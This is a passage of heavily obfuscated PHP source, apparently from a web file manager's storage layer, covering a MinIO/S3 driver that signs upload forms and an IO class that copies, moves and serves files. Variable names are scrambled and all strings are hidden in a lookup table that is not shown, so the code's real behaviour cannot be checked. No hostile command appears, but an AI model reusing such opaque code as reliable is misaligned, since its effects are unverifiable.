$this->cacheMethod($_SERVER[Î‹ÃÂŞ„][168], $—ºò¼ã); } protected function objectMeta($“•øßèÀ) { return $this->cacheMethod($_SERVER[Î‹ÃÂŞ„][170], $“•øßèÀ); } protected function _objectMeta($ˆ½ßíÜô) { $ï‹Ø«ãœ =& $_SERVER[Î‹ÃÂŞ„]; $ˆ½ßíÜô = rtrim($ˆ½ßíÜô, $ï‹Ø«ãœ[8]); try { $¥œ€¤Ú = $this->client->getObjectInfo($this->bucket, $ˆ½ßíÜô); if (!isset($¥œ€¤Ú[$ï‹Ø«ãœ[238]]) && isset($¥œ€¤Ú[$ï‹Ø«ãœ[254]])) { $¥œ€¤Ú[$ï‹Ø«ãœ[238]] = $¥œ€¤Ú[$ï‹Ø«ãœ[254]]; } } catch (Exception $íÙ‡ß±Ï) { $¥œ€¤Ú = !1; } if (!$¥œ€¤Ú) { } return $¥œ€¤Ú; } protected function _isFolder($à¡´¸°) { $ƒõßˆ¹ê =& $_SERVER[Î‹ÃÂŞ„]; $à¡´¸° = rtrim($à¡´¸°, $ƒõßˆ¹ê[8]); if ($à¡´¸° == $ƒõßˆ¹ê[12] || $à¡´¸° == $ƒõßˆ¹ê[8]) { return !0; } $õŸÁŞİ• = $this->client->getBucket($this->bucket, $à¡´¸°, null, 1); if (empty($õŸÁŞİ•[$ƒõßˆ¹ê[222]])) { return !1; } $ä—Ü† = $õŸÁŞİ•[$ƒõßˆ¹ê[222]][0][$ƒõßˆ¹ê[32]]; return stripos($ä—Ü†, $à¡´¸° . $ƒõßˆ¹ê[8]) === 0 ? !0 : !1; if (substr($ä—Ü†, -1) == $ƒõßˆ¹ê[8]) { return !0; } if (get_path_this($ä—Ü†) == get_path_this($à¡´¸°)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($ü¾ü¥Šá) { parent::__construct($ü¾ü¥Šá); $this->signatureVersion($_SERVER[Î‹ÃÂŞ„][233]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function uploadFormData($œù«¬€‹, $Ÿ¸¯ùÎµ = 3600) { $ÎŞáˆ¤â =& $_SERVER[Î‹ÃÂŞ„]; $õÛéÄ±Ã = $ÎŞáˆ¤â[215]; $ÃÅ„˜¢ = $ÎŞáˆ¤â[255]; $çîµ¿ = $ÎŞáˆ¤â[62]; $é¸—™Ó = gmdate($ÎŞáˆ¤â[256]); $‚ÃË“ = gmdate($ÎŞáˆ¤â[257]); $ä„¯®ïĞ = $ÎŞáˆ¤â[258]; $ŒŒÛÃ— = $Ÿ¸¯ùÎµ . $ÎŞáˆ¤â[12]; $…•‹ˆÔí = $ÎŞáˆ¤â[259]; $°¶ò¿Ô¾ = array($this->accessKey, $‚ÃË“, $this->region, $çîµ¿, $ä„¯®ïĞ); $¾øˆ¢’‚ = implode($ÎŞáˆ¤â[8], $°¶ò¿Ô¾); $ª‹ËéËÔ = array($ÎŞáˆ¤â[260] => gmdate($ÎŞáˆ¤â[261], strtotime($ÎŞáˆ¤â[262])), $ÎŞáˆ¤â[263] => array(array($ÎŞáˆ¤â[264] => $this->bucket), array($ÎŞáˆ¤â[265] => $õÛéÄ±Ã), array($ÎŞáˆ¤â[266], $ÎŞáˆ¤â[267], $ÎŞáˆ¤â[12]), array($ÎŞáˆ¤â[266], $ÎŞáˆ¤â[268], $ÎŞáˆ¤â[12]), array($ÎŞáˆ¤â[266], $ÎŞáˆ¤â[269], $ÎŞáˆ¤â[12]), array($ÎŞáˆ¤â[270] => $…•‹ˆÔí), array($ÎŞáˆ¤â[271] => $¾øˆ¢’‚), array($ÎŞáˆ¤â[272] => $ÃÅ„˜¢), array($ÎŞáˆ¤â[273] => $é¸—™Ó), array($ÎŞáˆ¤â[274] => $ŒŒÛÃ—))); $“ùõ¡‰º = base64_encode(json_encode($ª‹ËéËÔ)); $êëÃÆØ¿ = hash_hmac($ÎŞáˆ¤â[275], $‚ÃË“, $ÎŞáˆ¤â[276] . $this->secret, !0); $„Ø§Ïú´ = hash_hmac($ÎŞáˆ¤â[275], $this->region, $êëÃÆØ¿, !0); $ˆ”áåÆı = hash_hmac($ÎŞáˆ¤â[275], $çîµ¿, $„Ø§Ïú´, !0); $ÉÅ¾ÔÀá = hash_hmac($ÎŞáˆ¤â[275], $ä„¯®ïĞ, $ˆ”áåÆı, !0); $½ÓÓ = hash_hmac($ÎŞáˆ¤â[275], $“ùõ¡‰º, $ÉÅ¾ÔÀá); $Í»¹•ÃÊ = array($ÎŞáˆ¤â[232] => $ÎŞáˆ¤â[12], $ÎŞáˆ¤â[277] => $ÎŞáˆ¤â[12], $ÎŞáˆ¤â[265] => $õÛéÄ±Ã, $ÎŞáˆ¤â[270] => $…•‹ˆÔí, $ÎŞáˆ¤â[278] => $“ùõ¡‰º, $ÎŞáˆ¤â[279] => $¾øˆ¢’‚, $ÎŞáˆ¤â[280] => $ÃÅ„˜¢, $ÎŞáˆ¤â[281] => $é¸—™Ó, $ÎŞáˆ¤â[282] => $ŒŒÛÃ—, $ÎŞáˆ¤â[283] => $½ÓÓ, $ÎŞáˆ¤â[198] => $this->getHost()); return $Í»¹•ÃÊ; } } goto c¢˜İÉÌÊĞ; eøƒ÷…®ÓŸ: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ûÉôöÈ, $î×óó±) { $èÒóô†ğ =& $_SERVER[Î‹ÃÂŞ„]; $‡®İ×ÒÕ = $î×óó±; $GLOBALS[$èÒóô†ğ[1201]] = $èÒóô†ğ[1202] . $ûÉôöÈ; Hook::trigger($èÒóô†ğ[1202] . $ûÉôöÈ . $èÒóô†ğ[1203], $‡®İ×ÒÕ); $áİô¬®± = self::driverMake($î×óó±[0]); if (!$áİô¬®±) { return !1; } if (method_exists($áİô¬®±, $ûÉôöÈ)) { $à¡¼âÙ = @call_user_func_array(array($áİô¬®±, $ûÉôöÈ), $î×óó±); } else { if (method_exists($áİô¬®±, $èÒóô†ğ[1204])) { $à¡¼âÙ = @call_user_func_array(array($áİô¬®±, $ûÉôöÈ), $î×óó±); } else { if (method_exists(self, $ûÉôöÈ)) { $à¡¼âÙ = @call_user_func_array(array(self, $ûÉôöÈ), $î×óó±); } else { $à¡¼âÙ = call_user_func_array(array(parent, $ûÉôöÈ), $î×óó±); } } } Hook::trigger($èÒóô†ğ[1202] . $ûÉôöÈ . $èÒóô†ğ[1205], $‡®İ×ÒÕ, $à¡¼âÙ); return $à¡¼âÙ; } public static function init($Òı¯Õ·ó) { return self::driverMake($Òı¯Õ·ó); } public static function copy($£Ù‚™ó, $¦Ç“•Ó, $·Š‰Šæ÷ = false, $—İ•æÀ = false) { return self::copyMoveStart($£Ù‚™ó, $¦Ç“•Ó, $·Š‰Šæ÷, $_SERVER[Î‹ÃÂŞ„][589], $—İ•æÀ); } public static function move($“”êïÁÀ, $ÑÕ´ŸÙÇ, $«¥Î’¾ = false, $ºÔ¿ñ¸‹ = false) { return self::copyMoveStart($“”êïÁÀ, $ÑÕ´ŸÙÇ, $«¥Î’¾, $_SERVER[Î‹ÃÂŞ„][591], $ºÔ¿ñ¸‹); } private static function copyMoveStart($ëŸ‰ªò¾, $£¥ïùĞª, $ìÔå€É, $îÓ°£ŸĞ, $õ­Èœ´“) { $Üóšñ¿Ì =& $_SERVER[Î‹ÃÂŞ„]; $øÆğŒú = array($ëŸ‰ªò¾, $£¥ïùĞª, $ìÔå€É, $õ­Èœ´“); Hook::trigger($Üóšñ¿Ì[1202] . $îÓ°£ŸĞ . $Üóšñ¿Ì[1203], $øÆğŒú); $Ä¿º¢üÄ = self::copyMove($ëŸ‰ªò¾, $£¥ïùĞª, $ìÔå€É, $îÓ°£ŸĞ, $õ­Èœ´“); Hook::trigger($Üóšñ¿Ì[1202] . $îÓ°£ŸĞ . $Üóšñ¿Ì[1205], $øÆğŒú, $Ä¿º¢üÄ); return $Ä¿º¢üÄ; } public static function saveFile($£÷ÂÒ„Ú, $îô™•ÛÚ, $œÕ–£ø = true) { $–©­»Ç¾ =& $_SERVER[Î‹ÃÂŞ„]; $ŠÅ¯°÷ = self::info($îô™•ÛÚ); $ç„á¬©â = self::driverMake($£÷ÂÒ„Ú); $ÏŠÍ’Åè = self::driverMake($îô™•ÛÚ); $öÀÁóĞ† = !1; if ($ÏŠÍ’Åè->pathParse[$–©­»Ç¾[1206]]) { $öÀÁóĞ† = $ÏŠÍ’Åè; $‚´ºîÒĞ = $ÏŠÍ’Åè->pathParse[$–©­»Ç¾[1206]]; $ÏŠÍ’Åè = self::driverMake($‚´ºîÒĞ); } if ($ç„á¬©â->pathParse[$–©­»Ç¾[1206]]) { $é•åäÁ… = $ç„á¬©â->pathParse[$–©­»Ç¾[1206]]; $ç„á¬©â = self::driverMake($é•åäÁ…); } $¥¸÷Ö¿Ğ = $ÏŠÍ’Åè->pathFather($îô™•ÛÚ); $ ÔÀĞà¿ = !0; if (!$œÕ–£ø && self::driverIsSame($ç„á¬©â, $ÏŠÍ’Åè)) { $ ÔÀĞà¿ = !1; } $…Ó˜ì×” = self::copyFile($ç„á¬©â, $£÷ÂÒ„Ú, $ÏŠÍ’Åè, $¥¸÷Ö¿Ğ, $ŠÅ¯°÷[$–©­»Ç¾[32]], $ ÔÀĞà¿); if ($öÀÁóĞ†) { $…Ó˜ì×” = $öÀÁóĞ†->getPathOuter($…Ó˜ì×”); } return $…Ó˜ì×”; } private static function copyMove($„ÎÃ×µÔ, $™ÕÈş§¥, $¤‹ØÚîî, $éŞÉÎ°ó, $²ğù˜ŸÓ = false) { $ş€¡ =& $_SERVER[Î‹ÃÂŞ„]; if (!$„ÎÃ×µÔ || $„ÎÃ×µÔ == $ş€¡[8] || !$™ÕÈş§¥) { return !1; } ignore_timeout(); $¤µÇôğà = self::driverMake($„ÎÃ×µÔ); $§æÕš° = self::driverMake($™ÕÈş§¥); $¼Áˆ’¼Ğ = $éŞÉÎ°ó == $ş€¡[591]; $“ ´£Ç¡ = !1; if ($§æÕš°->pathParse[$ş€¡[1206]]) { $“ ´£Ç¡ = $§æÕš°; $™ÕÈş§¥ = $§æÕš°->pathParse[$ş€¡[1206]]; $§æÕš° = self::driverMake($™ÕÈş§¥); } if ($¤µÇôğà->pathParse[$ş€¡[1206]]) { $„ÎÃ×µÔ = $¤µÇôğà->pathParse[$ş€¡[1206]]; $¤µÇôğà = self::driverMake($„ÎÃ×µÔ); } self::check($¤µÇôğà, $„ÎÃ×µÔ, $§æÕš°, $™ÕÈş§¥); Hook::trigger($ş€¡[1207], $¤µÇôğà, $„ÎÃ×µÔ, $§æÕš°, $™ÕÈş§¥); $ü¶’Û¢ = self::driverIsSame($¤µÇôğà, $§æÕš°); if ($ü¶’Û¢) { if ($éŞÉÎ°ó == $ş€¡[591] && !method_exists($§æÕš°, $ş€¡[1208]) && trim($™ÕÈş§¥, $ş€¡[8]) == trim($§æÕš°->pathFather($„ÎÃ×µÔ), $ş€¡[8])) { if ($¤µÇôğà->pathThis($„ÎÃ×µÔ) != $²ğù˜ŸÓ && !$¤µÇôğà->isTypeObject()) { return $¤µÇôğà->rename($„ÎÃ×µÔ, $²ğù˜ŸÓ); } return $§æÕš°->getPathOuter($„ÎÃ×µÔ); } if (method_exists($§æÕš°, $éŞÉÎ°ó)) { return $§æÕš°->{$éŞÉÎ°ó}($„ÎÃ×µÔ, $™ÕÈş§¥, $¤‹ØÚîî, $²ğù˜ŸÓ); } } if ($ü¶’Û¢ && $éŞÉÎ°ó == $ş€¡[591] && $§æÕš°->getType() == $ş€¡[108]) { $¨èıŸİê = $§æÕš°->movePath($„ÎÃ×µÔ, $™ÕÈş§¥, $²ğù˜ŸÓ); if ($¨èıŸİê) { return $¨èıŸİê; } } $Ë«‘‹ãÙ = $¤µÇôğà->isFile($„ÎÃ×µÔ); if (!$Ë«‘‹ãÙ && $§æÕš°->getType() == $ş€¡[804] && $¤µÇôğà->getType() == $ş€¡[108]) { $¨èıŸİê = $§æÕš°->copyFolderFromIO($¤µÇôğà, $„ÎÃ×µÔ, $™ÕÈş§¥, $¤‹ØÚîî, $¼Áˆ’¼Ğ, $²ğù˜ŸÓ); } else { $¨èıŸİê = self::copyPath($¤µÇôğà, $„ÎÃ×µÔ, $§æÕš°, $™ÕÈş§¥, $¤‹ØÚîî, $¼Áˆ’¼Ğ, $Ë«‘‹ãÙ, $²ğù˜ŸÓ); } if ($¨èıŸİê && $¼Áˆ’¼Ğ) { $¤µÇôğà->remove($„ÎÃ×µÔ); } if ($“ ´£Ç¡) { $¨èıŸİê = $“ ´£Ç¡->getPathOuter($¨èıŸİê); } return $¨èıŸİê; } private static function check($—áìÔ£, $µÙ½Ôã, $óÊ°×‹ò, &$Ãäıæ”é) { $Ÿˆè‚íç =& $_SERVER[Î‹ÃÂŞ„]; if (self::driverIsSame($—áìÔ£, $óÊ°×‹ò) && $—áìÔ£->isFolder($µÙ½Ôã) && $—áìÔ£->isParentOf($µÙ½Ôã, $Ãäıæ”é)) { show_json(LNG($Ÿˆè‚íç[1209]), !1); } if (!$—áìÔ£->exist($µÙ½Ôã)) { show_json(LNG($Ÿˆè‚íç[107]), !1); } } private static function copyPath($ƒÑ¸§ãì, $ÇÛ±‹¨í, $ºİœº¬€, $áª’şÑ”, $™Şë¬¯ë, $¬„›­¾, $îÁÂÆ¥×, $Ù«óìõ£ = false, $ÍšÎº…³ = true) { $¿Ä„±—Ë =& $_SERVER[Î‹ÃÂŞ„]; $ÂÎ‡™€ = empty($Ù«óìõ£) && $Ù«óìõ£ !== $¿Ä„±—Ë[214] ? $ƒÑ¸§ãì->pathThis($ÇÛ±‹¨í) : $Ù«óìõ£; if ($™Şë¬¯ë) { $Œ‘Íé‚Ä = $ºİœº¬€->fileNameExist($áª’şÑ”, $ÂÎ‡™€); $„ñåÅÓ = $ÂÎ‡™€; $ÂÎ‡™€ = $ºİœº¬€->fileNameAuto($áª’şÑ”, $ÂÎ‡™€, $™Şë¬¯ë, !$îÁÂÆ¥×); if (!$Œ‘Íé‚Ä || $„ñåÅÓ != $ÂÎ‡™€) { $™Şë¬¯ë = !1; } if ($ÍšÎº…³ && !$™Şë¬¯ë) { $ºİœº¬€->_data[$¿Ä„±—Ë[1210]] = !0; } } if ($îÁÂÆ¥×) { return self::copyFile($ƒÑ¸§ãì, $ÇÛ±‹¨í, $ºİœº¬€, $áª’şÑ”, $ÂÎ‡™€, $¬„›­¾); } if ($™Şë¬¯ë == REPEAT_RENAME_FOLDER) { $™Şë¬¯ë = !1; } $ÎáïåË¶ = rtrim($áª’şÑ”, $¿Ä„±—Ë[8]) . $¿Ä„±—Ë[8] . $ÂÎ‡™€; $ÚÙ¶ÊŸ™ = $ºİœº¬€->mkdir($ºİœº¬€->getPath($ÎáïåË¶), $™Şë¬¯ë); $áª’şÑ” = $ºİœº¬€->getPathInner($ÚÙ¶ÊŸ™); $¶µÅ¤¦Í = $ƒÑ¸§ãì->listPath($ÇÛ±‹¨í, !0); $¶µÅ¤¦Í = is_array($¶µÅ¤¦Í) ? $¶µÅ¤¦Í : array($¿Ä„±—Ë[85] => array(), $¿Ä„±—Ë[84] => array()); $­Î°·ˆ = array_merge($¶µÅ¤¦Í[$¿Ä„±—Ë[85]], $¶µÅ¤¦Í[$¿Ä„±—Ë[84]]); foreach ($­Î°·ˆ as $¢‚­––) { $æè¨Î×Ó = $¢‚­––[$¿Ä„±—Ë[33]] == $¿Ä„±—Ë[216]; $ÇÛ±‹¨í = $ƒÑ¸§ãì->getPathInner($¢‚­––[$¿Ä„±—Ë[86]]); $Õ‘†»¶¾ = self::copyPath($ƒÑ¸§ãì, $ÇÛ±‹¨í, $ºİœº¬€, $áª’şÑ”, $™Şë¬¯ë, $¬„›­¾, $æè¨Î×Ó, !1, !1); if (!$Õ‘†»¶¾) { IO::errorTips($¿Ä„±—Ë[1211] . $ÇÛ±‹¨í . $¿Ä„±—Ë[72] . $áª’şÑ”); } } self::copyMoveKeepInfo($ƒÑ¸§ãì, $ÇÛ±‹¨í, $ÚÙ¶ÊŸ™); return $ÚÙ¶ÊŸ™; } private static function copyFile($Í„Êñ§, $ïåğ¶ı¸, $ª«ªÚ³, $ĞÖÑÍ¹è, $“şäë¿Ğ, $‰Œà¶¢) { $˜ó±Á¶í =& $_SERVER[Î‹ÃÂŞ„]; $ĞÖÑÍ¹è = $ª«ªÚ³->getPath(rtrim($ĞÖÑÍ¹è, $˜ó±Á¶í[8]) . $˜ó±Á¶í[8] . $“şäë¿Ğ); $ÑÚûê˜• = $˜ó±Á¶í[1212] . time() . rand_string(5); Hook::trigger($˜ó±Á¶í[1213], $Í„Êñ§, $ïåğ¶ı¸, $ª«ªÚ³, $ĞÖÑÍ¹è, $“şäë¿Ğ, $ÑÚûê˜•); if (self::driverIsSame($Í„Êñ§, $ª«ªÚ³)) { if ($‰Œà¶¢) { $ü¹¨éÃ… = $ª«ªÚ³->moveFile($ïåğ¶ı¸, $ĞÖÑÍ¹è); } else { $ü¹¨éÃ… = $ª«ªÚ³->copyFile($ïåğ¶ı¸, $ĞÖÑÍ¹è); } Hook::trigger($˜ó±Á¶í[1214], $Í„Êñ§, $ïåğ¶ı¸, $ª«ªÚ³, $ĞÖÑÍ¹è, $“şäë¿Ğ, $ü¹¨éÃ…); self::copyMoveKeepInfo($Í„Êñ§, $ïåğ¶ı¸, $ü¹¨éÃ…); return $ü¹¨éÃ…; } $ÙåÀ¡ì¶ = TEMP_FILES; if ($GLOBALS[$˜ó±Á¶í[6]][$˜ó±Á¶í[91]][$˜ó±Á¶í[843]]) { $ÙåÀ¡ì¶ = $GLOBALS[$˜ó±Á¶í[6]][$˜ó±Á¶í[91]][$˜ó±Á¶í[843]]; } $†ÄËÖÙŠ = $ÙåÀ¡ì¶; mk_dir($†ÄËÖÙŠ); $ÃŒğûŞÅ = $†ÄËÖÙŠ . $ÑÚûê˜•; $…õÆœ¢Ô = $ÃŒğûŞÅ; $ÃŒğûŞÅ = $Í„Êñ§->download($ïåğ¶ı¸, $ÃŒğûŞÅ); $ÃŒğûŞÅ = $Í„Êñ§->iconvApp($ÃŒğûŞÅ); if (substr($ÃŒğûŞÅ, strlen($ÙåÀ¡ì¶)) == $ÙåÀ¡ì¶) { $‰Œà¶¢ = !0; } $ü¹¨éÃ… = $ª«ªÚ³->upload($ĞÖÑÍ¹è, $ÃŒğûŞÅ, $‰Œà¶¢); self::remove($…õÆœ¢Ô); Hook::trigger($˜ó±Á¶í[1214], $Í„Êñ§, $ïåğ¶ı¸, $ª«ªÚ³, $ĞÖÑÍ¹è, $“şäë¿Ğ, $ü¹¨éÃ…); self::copyMoveKeepInfo($Í„Êñ§, $ïåğ¶ı¸, $ü¹¨éÃ…); return $ü¹¨éÃ…; } private static function copyMoveKeepInfo($ËˆùƒÄõ, $îÆÃŞñô, $¡¦Ä­ÙÎ) { if (!$¡¦Ä­ÙÎ) { return; } $†˜ğ»Ùé = $ËˆùƒÄõ->info($îÆÃŞñô); if (!is_array($†˜ğ»Ùé)) { return; } IO::setModifyTime($¡¦Ä­ÙÎ, $†˜ğ»Ùé[$_SERVER[Î‹ÃÂŞ„][87]]); } public static function pathFather($¾œåİÑ) { $‘“¦Íôâ = IO::init($¾œåİÑ); $¤üÖÂäÉ = $‘“¦Íôâ->pathFather($‘“¦Íôâ->path); return $‘“¦Íôâ->getPathOuter($¤üÖÂäÉ); } public static function fileOut($ìÅ´Ş“Š, $Ó°ÖíÌ§ = false, $¾¹§Æä = false, $äó€œİ£ = '') { $Æß°ş’¬ = self::driverMake($ìÅ´Ş“Š); if ($Æß°ş’¬->isFileOutServer()) { return $Æß°ş’¬->fileOutServer($ìÅ´Ş“Š, $Ó°ÖíÌ§, $¾¹§Æä, $äó€œİ£); } return $Æß°ş’¬->fileOut($ìÅ´Ş“Š, $Ó°ÖíÌ§, $¾¹§Æä, $äó€œİ£); } public static function fileOutImage($ÙšÔ¸À, $ä¢–ï­õ = 250) { $”­Ú³îÃ = array(250, 600, 1200, 2000, 3000, 5000); for ($ÆºìÉÑÉ = 0; $ÆºìÉÑÉ < count($”­Ú³îÃ); $ÆºìÉÑÉ++) { if ($ÆºìÉÑÉ == 0 && $ä¢–ï­õ <= $”­Ú³îÃ[$ÆºìÉÑÉ]) { $ä¢–ï­õ = $”­Ú³îÃ[$ÆºìÉÑÉ]; break; } else { if ($ä¢–ï­õ > $”­Ú³îÃ[$ÆºìÉÑÉ - 1] && $ä¢–ï­õ <= $”­Ú³îÃ[$ÆºìÉÑÉ]) { $ä¢–ï­õ = $”­Ú³îÃ[$ÆºìÉÑÉ]; break; } else { if ($ÆºìÉÑÉ == count($”­Ú³îÃ) - 1 && $ä¢–ï­õ > $”­Ú³îÃ[$ÆºìÉÑÉ]) { $ä¢–ï­õ = $”­Ú³îÃ[$ÆºìÉÑÉ]; break; } } } } $„€·ˆ˜Š = self::driverMake($ÙšÔ¸À); if ($„€·ˆ˜Š->isFileOutServer()) { return $„€·ˆ˜Š->fileOutImageServer($ÙšÔ¸À, $ä¢–ï­õ); } return $„€·ˆ˜Š->fileOutImage($ÙšÔ¸À, $ä¢–ï­õ); } private static function driverIsSame($àÃÕˆ­¾, $ƒÓô †) { $Í¬¸¿’ =& $_SERVER[Î‹ÃÂŞ„]; $±ï±åÌ = $àÃÕˆ­¾->getType(); $ùÁ¯Ÿí‡ = $ƒÓô †->getType(); if ($±ï±åÌ != $ùÁ¯Ÿí‡) { return !1; } if ($±ï±åÌ == $Í¬¸¿’[804]) { return !0; } if ($±ï±åÌ == $Í¬¸¿’[108]) { return !0; } if ($àÃÕˆ­¾->pathDriver == $ƒÓô †->pathDriver) { return !0; } return !1; } public static function copyUpdate($Ìú¢òÕ, $ŞæùıŸÄ) { $úª€¯ñ¢ =& $_SERVER[Î‹ÃÂŞ„]; if (!IO::exist($Ìú¢òÕ)) { return !1; } if (!IO::exist($ŞæùıŸÄ)) { IO::mkdir($ŞæùıŸÄ); } $ÊÃªàßä = array_to_keyvalue(self::listAllSimple($Ìú¢òÕ), $úª€¯ñ¢[86]); $åãá†…Á = array_to_keyvalue(self::listAllSimple($ŞæùıŸÄ), $úª€¯ñ¢[86]); $ä¿Â¼øÕ = array(); $ùÚËæ»İ = array(); foreach ($ÊÃªàßä as $èÅÆŠ’ => $Şó¦öÃ) { if (isset($åãá†…Á[$èÅÆŠ’])) { if ($Şó¦öÃ[$úª€¯ñ¢[77]] == 1) { continue; } if ($åãá†…Á[$èÅÆŠ’][$úª€¯ñ¢[78]] == $Şó¦öÃ[$úª€¯ñ¢[78]]) { continue; } } if ($Şó¦öÃ[$úª€¯ñ¢[77]] == 1) { $ùÚËæ»İ[] = $ŞæùıŸÄ . $úª€¯ñ¢[8] . trim($èÅÆŠ’, $úª€¯ñ¢[8]); continue; } $ü‚ùí£İ = strstr(trim($èÅÆŠ’, $úª€¯ñ¢[8]), $úª€¯ñ¢[8]) ? get_path_father($èÅÆŠ’) : $úª€¯ñ¢[12]; $ä¿Â¼øÕ[] = array($úª€¯ñ¢[1215] => $Şó¦öÃ[$úª€¯ñ¢[88]], $úª€¯ñ¢[1216] => rtrim($ŞæùıŸÄ, $úª€¯ñ¢[8]) . $úª€¯ñ¢[8] . $ü‚ùí£İ, $úª€¯ñ¢[1217] => $Şó¦öÃ); } $öå„äĞõ = array($úª€¯ñ¢[216] => $ä¿Â¼øÕ, $úª€¯ñ¢[77] => $ùÚËæ»İ); Hook::trigger($úª€¯ñ¢[1218], $Ìú¢òÕ, $ŞæùıŸÄ, $öå„äĞõ); foreach ($ùÚËæ»İ as $Şó¦öÃ) { IO::mkdir($Şó¦öÃ); } foreach ($ä¿Â¼øÕ as $Şó¦öÃ) { IO::copy($Şó¦öÃ[$úª€¯ñ¢[1215]], $Şó¦öÃ[$úª€¯ñ¢[1216]], REPEAT_REPLACE); } } public static function fileSubstr($ªÜ°±Å, $Î°…­¿‰, $ÚŒóğé = false) { $¯ºØ¤Ì =& $_SERVER[Î‹ÃÂŞ„]; $ïí¢•­ = self::driverMake($ªÜ°±Å); $‘®ì¢¥ = $ïí¢•­->size($ªÜ°±Å); $öá‰Íæ¦ = $Î°…­¿‰; $˜Œ¼åÉ¹ = $ÚŒóğé; if ($Î°…­¿‰ < 0) { $Î°…­¿‰ = $‘®ì¢¥ + $Î°…­¿‰; } if ($ÚŒóğé === !1) { $ÚŒóğé = $‘®ì¢¥ - $Î°…­¿‰; } if ($Î°…­¿‰ + $ÚŒóğé > $‘®ì¢¥) { $ÚŒóğé = $‘®ì¢¥ - $Î°…­¿‰; } if (!$‘®ì¢¥ && $ïí¢•­->getType() == $¯ºØ¤Ì[108] && !$ïí¢•­->exist($ªÜ°±Å)) { $Èé×ƒò„ = get_path_this($ªÜ°±Å); $®šü = parse_url_query($Èé×ƒò„); if (is_array($®šü) && isset($®šü[$¯ºØ¤Ì[32]])) { $Èé×ƒò„ = urldecode($®šü[$¯ºØ¤Ì[32]]); } throw new Exception($¯ºØ¤Ì[1219] . LNG($¯ºØ¤Ì[1220]) . $¯ºØ¤Ì[1021] . clear_html($Èé×ƒò„) . $¯ºØ¤Ì[12]); } if ($ÚŒóğé <= 0) { return $¯ºØ¤Ì[12]; } if ($Î°…­¿‰ < 0 || $Î°…­¿‰ >= $‘®ì¢¥ || $ÚŒóğé > 1024 * 1024 * 10) { throw new Exception("\x66\151\x6c\145\122\x65\x61\x64\40\145\x72\162\x6f\x72\41\40\163\164\141\x72\164\75{$Î°…­¿‰}\73\154\145\156\147\x74\150\x3d{$ÚŒóğé}\73\40\163\151\172\145\75{$‘®ì¢¥}\x3b"); } $“ğğíÇô = $ïí¢•­->fileSubstr($ªÜ°±Å, $Î°…­¿‰, $ÚŒóğé); if (!$“ğğíÇô && $ÚŒóğé && isset($GLOBALS[$¯ºØ¤Ì[1221]])) { throw new Exception($GLOBALS[$¯ºØ¤Ì[1221]][$¯ºØ¤Ì[1222]]); } return $“ğğíÇô; } private static function driverMake(&$ü”ÎääÏ) { $¾‚•è½² =& $_SERVER[Î‹ÃÂŞ„]; $ííÛÌ§° = KodIO::parse($ü”ÎääÏ); if (!self::$driverListSystem) { $í£¬± = Model($¾‚•è½²[814])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($í£¬±, $¾‚•è½²[445]); } if ($ííÛÌ§°[$¾‚•è½²[33]] == KodIO::KOD_IO && !self::$driverListSystem[$ííÛÌ§°[$¾‚•è½²[445]]]) { return !1; } $ü”ÎääÏ = $ííÛÌ§°[$¾‚•è½²[1223]]; $¤Øø¶ÒÁ = self::driverGet($ííÛÌ§°, $ü”ÎääÏ); return $¤Øø¶ÒÁ; } private static function driverGet($öªáŸ, &$Ôê¡Ï‚°) { $°ƒƒÇìı =& $_SERVER[Î‹ÃÂŞ„]; $¢ûœîé… = $öªáŸ[$°ƒƒÇìı[1224]]; $†Í®×ˆ‹ = $öªáŸ[$°ƒƒÇìı[445]]; switch ($öªáŸ[$°ƒƒÇìı[33]]) { case KodIO::KOD_IO: $¼ÆÆİƒÖ = self::$driverListSystem[$†Í®×ˆ‹]; break; case KodIO::KOD_SOURCE: $Ôê¡Ï‚° = $†Í®×ˆ‹ . $Ôê¡Ï‚°; $¼ÆÆİƒÖ = array($°ƒƒÇìı[1225] => $°ƒƒÇìı[1226], $°ƒƒÇìı[6] => $öªáŸ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $¶î§ÒÓÏ = $GLOBALS[$°ƒƒÇìı[1227]]; self::$driverListUser = array_to_keyvalue($¶î§ÒÓÏ, $°ƒƒÇìı[445]); } $¼ÆÆİƒÖ = self::$driverListUser[$†Í®×ˆ‹]; break; case KodIO::KOD_SHARE_LINK: $¼ÆÆİƒÖ = array($°ƒƒÇìı[1225] => $°ƒƒÇìı[1228], $°ƒƒÇìı[6] => $öªáŸ); $ç¤²ÄÖÈ = Action($°ƒƒÇìı[1229])->sharePathInfo($öªáŸ[$°ƒƒÇìı[86]]); $Ôê¡Ï‚° = $ç¤²ÄÖÈ[$°ƒƒÇìı[183]]; if (!$ç¤²ÄÖÈ[$°ƒƒÇìı[183]]) { $±§¡ã«í = Model($°ƒƒÇìı[635])->getInfo($ç¤²ÄÖÈ[$°ƒƒÇìı[636]]); $Ôê¡Ï‚° = KodIO::clear($±§¡ã«í[$°ƒƒÇìı[1230]] . $öªáŸ[$°ƒƒÇìı[1223]]); $öªáŸ[$°ƒƒÇìı[531]] = $±§¡ã«í; $öªáŸ[$°ƒƒÇìı[1206]] = $Ôê¡Ï‚°; $¼ÆÆİƒÖ = array($°ƒƒÇìı[1225] => $°ƒƒÇìı[1231], $°ƒƒÇìı[6] => $öªáŸ); } break; case KodIO::KOD_SHARE_ITEM: $¼ÆÆİƒÖ = array($°ƒƒÇìı[1225] => $°ƒƒÇìı[1232], $°ƒƒÇìı[6] => $öªáŸ); $±§¡ã«í = Model($°ƒƒÇìı[635])->getInfo($öªáŸ[$°ƒƒÇìı[445]]); if ($±§¡ã«í[$°ƒƒÇìı[183]] == $°ƒƒÇìı[214]) { $Ôê¡Ï‚° = KodIO::clear($±§¡ã«í[$°ƒƒÇìı[1230]] . $öªáŸ[$°ƒƒÇìı[1223]]); $öªáŸ[$°ƒƒÇìı[531]] = $±§¡ã«í; $öªáŸ[$°ƒƒÇìı[1206]] = $Ôê¡Ï‚°; $¼ÆÆİƒÖ = array($°ƒƒÇìı[1225] => $°ƒƒÇìı[1233], $°ƒƒÇìı[6] => $öªáŸ); } else { if (!$Ôê¡Ï‚°) { $Ôê¡Ï‚° = $±§¡ã«í[$°ƒƒÇìı[183]]; } } break; default: $Ôê¡Ï‚° = $öªáŸ[$°ƒƒÇìı[86]]; 